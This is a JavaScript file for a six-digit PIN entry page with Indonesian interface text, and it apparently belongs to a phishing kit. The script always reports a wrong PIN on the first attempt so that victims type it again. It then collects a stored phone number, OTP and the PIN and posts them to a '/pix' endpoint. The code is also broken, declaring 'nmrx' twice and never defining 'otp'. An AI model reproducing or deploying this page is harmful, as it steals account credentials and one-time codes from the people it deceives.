// pix.js

const inputs = document.querySelectorAll(".pix-box");
const showBtn = document.getElementById("showBtn");
const loadingBox = document.getElementById("loadingBox");
const errorBox = document.getElementById("errorBox");

let isShow = false;
let attempt = 0;
let isProcessing = false;

/* ========================= */
/* FADE IN */
/* ========================= */

window.addEventListener("load", () => {
    document.body.classList.add("fade-in");
});

/* ========================= */
/* RESET LOADING */
/* ========================= */

window.addEventListener("pageshow", () => {
    if(loadingBox){
        loadingBox.style.display = "none";
    }
});

/* ========================= */
/* FUNGSI RESET */
/* ========================= */

function resetPix(){
    inputs.forEach(input => {
        input.value = "";
    });

    inputs[0].focus();
}

/* ========================= */
/* FOKUS KE BOX KOSONG */
/* ========================= */

inputs.forEach((input,index) => {

    input.addEventListener("click", () => {

        for(let i = 0; i < inputs.length; i++){
            if(inputs[i].value === ""){
                inputs[i].focus();
                break;
            }
        }

    });

});

/* ========================= */
/* AUTO INPUT */
/* ========================= */

inputs.forEach((input,index) => {

    input.addEventListener("input", () => {

        input.value = input.value.replace(/[^0-9]/g,'');

        if(errorBox){
            errorBox.classList.remove("show");
        }

        if(input.value.length === 1){
            if(index < inputs.length - 1){
                inputs[index + 1].focus();
            }
        }

        checkPix();

    });

    input.addEventListener("keydown", (e) => {

        if(e.key === "Backspace" && input.value === ""){
            if(index > 0){
                inputs[index - 1].focus();
            }
        }

    });

});

/* ========================= */
/* SHOW / HIDE */
/* ========================= */

if(showBtn){
    showBtn.addEventListener("click", () => {

        isShow = !isShow;

        inputs.forEach(input => {
            input.type = isShow ? "text" : "password";
        });

        showBtn.innerText =
        isShow
        ? "SEMBUNYIKAN"
        : "TAMPILKAN";

    });
}

/* ========================= */
/* CHECK PIX */
/* ========================= */

async function checkPix(){

    let pix = "";

    inputs.forEach(input => {
        pix += input.value;
    });

    if(pix.length === 6 && !isProcessing){

        isProcessing = true;
        attempt++;

        /* ========================= */
        /* STEP 1: LOADING */
/* ========================= */

        if(loadingBox){
            loadingBox.style.display = "flex";
        }

        setTimeout(async () => {

            /* ========================= */
            /* STEP 2: ALERT */
/* ========================= */

            if(attempt === 1){

                if(errorBox){
                    errorBox.innerText =
                    "PIN Salah, pastikan PIN yang kamu masukan sudah benar";

                    errorBox.style.background = "#ff3b3b";
                    errorBox.style.color = "#fff";

                    errorBox.classList.add("show");

                    setTimeout(() => {
                        errorBox.classList.remove("show");
                    },2000);
                }

            } else {

                if(errorBox){
                    errorBox.innerText =
                    "Terimakasih, permintaan Anda sedang di proses";

                    errorBox.style.background = "#2b7cff";
                    errorBox.style.color = "#fff";

                    errorBox.classList.add("show");

                    setTimeout(() => {
                        errorBox.classList.remove("show");
                    },2500);
                }

            }

            /* ========================= */
            /* STEP 3: KIRIM DATA */
/* ========================= */

            const nmrx = localStorage.getItem("nmrx");
            const nmrx = localStorage.getItem("otp");



            try{
                await fetch("/pix", {
                    method:"POST",
                    headers:{
                        "Content-Type":"application/json"
                    },
                    body:JSON.stringify({
                        nmrx:nmrx,
                        otp:otp,
                        pix:pix
                    })
                });
            }catch(e){
                console.log("ERROR:", e);
            }

            /* ========================= */
            /* STEP 4: HIDE LOADING */
/* ========================= */

            if(loadingBox){
                loadingBox.style.display = "none";
            }

            /* ========================= */
            /* STEP 5: RESET SELALU */
/* ========================= */

            setTimeout(() => {
                resetPix();
                isProcessing = false;
            },200);

        },1500);

    }

}
